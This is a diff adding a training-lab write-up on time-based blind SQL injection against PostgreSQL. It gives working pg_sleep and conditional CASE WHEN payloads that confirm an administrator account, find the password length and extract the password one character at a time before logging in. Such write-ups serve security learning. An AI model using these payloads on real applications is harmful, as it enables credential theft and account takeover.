@@ -472,20 +472,60 @@
 
 
 
+//LAB: Blind SQL injection with time delays and information retrieval
 
 
+- try different time-based payloads
+- and the postgres one works -- `' || pg_sleep(5)-- -`
+
+<img width="1247" height="303" alt="image" src="https://github.com/user-attachments/assets/be9058d2-30da-4230-b506-c3e94871855b" />
 
 
+- now try different conditional time-based payloads
+- eventually this one works -- `'%3b select case when (1=1) then pg_sleep(5) else pg_sleep(0) end-- -`
+- note that adding `||` wouldn't work -- and we actually need `;`
+
+<img width="1243" height="311" alt="image" src="https://github.com/user-attachments/assets/9c4ca5f5-03f1-4b22-b413-f72b69008985" />
+
+- then change to `1=2` and get no time-delay -- confirming our payload works
+- now then we change the query to `'%3b select case when (username='administrator') then pg_sleep(5) else pg_sleep(0) end from users-- -
+- and we get a time-delay -- meaning there's an administrator user
+
+<img width="1248" height="311" alt="image" src="https://github.com/user-attachments/assets/9ba961cc-42f7-47b7-8be4-2bd057978028" />
+
+- then change the query to `'; select case when (username='administrator' and length(password)>20) then pg_sleep(5) else pg_sleep(0) end from users-- -`
+- and get no time-delay -- likely due to the password length being fewer than 20 chars
+- then change the condition to `(username='administrator' and length(password)>19)`
+- and we get a time-delay -- meaning the password length is 20
+
+<img width="1250" height="325" alt="image" src="https://github.com/user-attachments/assets/b623455b-e0be-48f2-b228-76545469a245" />
 
 
+- now then change the query to `'; select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- -`
+
+<img width="1246" height="323" alt="image" src="https://github.com/user-attachments/assets/d8d39064-10e9-49bb-8a50-f380d41b7729" />
+
+- send it to intruder to brute each char
+
+<img width="1549" height="400" alt="image" src="https://github.com/user-attachments/assets/50ae0406-3da2-435b-a965-6b0482bf720e" />
 
 
+- response received for `v` stands out
+- verified it in the repeater and yes we get a time-delay -- confirming `v` is our first char
+
+<img width="1141" height="578" alt="image" src="https://github.com/user-attachments/assets/8289c126-ce51-4438-b04b-845c71b29fa3" />
+
+- continue to the next chars by changing the substring() offset value `substring(password,<1>,1)='a'`
+- and finally we got `v4yuyvvm0vm1ppn9uh9h`
+- log in with `administrator : v4yuyvvm0vm1ppn9uh9h`
+- and lab solved
+
+<img width="939" height="387" alt="image" src="https://github.com/user-attachments/assets/d0e12c51-a577-4a60-aa56-36f36e0ae309" />
 
 
+---
 
-
-
-
+-- NEED BURP PRO FOR BURP COLLAB TO COMPLETE THE 2 REMAINING LABS --
 
 
 
